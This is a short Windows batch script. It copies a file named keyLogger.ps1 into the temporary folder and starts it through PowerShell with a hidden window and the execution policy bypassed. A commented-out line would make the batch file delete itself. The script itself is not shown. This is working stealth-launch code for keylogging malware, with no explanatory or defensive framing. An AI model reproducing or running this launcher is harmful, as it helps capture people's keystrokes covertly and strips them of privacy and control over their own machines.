@echo off

if not exist "%TEMP%\keyLogger.ps1" copy "%CD%\keyLogger.ps1" "%TEMP%" >NUL 2>&1
powershell -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%TEMP%\keyLogger.ps1\"' -WindowStyle Hidden"

REM del "%~f0"